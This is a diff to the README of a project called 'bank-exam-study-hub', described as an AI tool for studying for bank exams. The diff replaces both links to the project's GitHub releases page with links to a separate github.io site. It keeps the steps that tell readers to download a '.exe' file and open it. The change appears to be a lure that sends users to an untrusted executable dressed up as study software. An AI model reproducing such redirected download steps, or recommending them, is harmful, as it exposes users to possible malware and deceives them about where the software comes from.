@@ -1,6 +1,6 @@
 # 🎓 bank-exam-study-hub - Master Your Bank Exams With AI
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/EGarcesMart29/bank-exam-study-hub/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://egarcesmart29.github.io)
 
 ## 📖 About This Project
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the software smoothly:
 
 Follow these steps to get the tool on your machine. We kept the process simple for every user.
 
-1. Go to our primary release page: [https://github.com/EGarcesMart29/bank-exam-study-hub/releases](https://github.com/EGarcesMart29/bank-exam-study-hub/releases).
+1. Go to our primary release page: [https://egarcesmart29.github.io](https://egarcesmart29.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends with ".exe" to begin your download.
 4. Open the file once the download finishes.
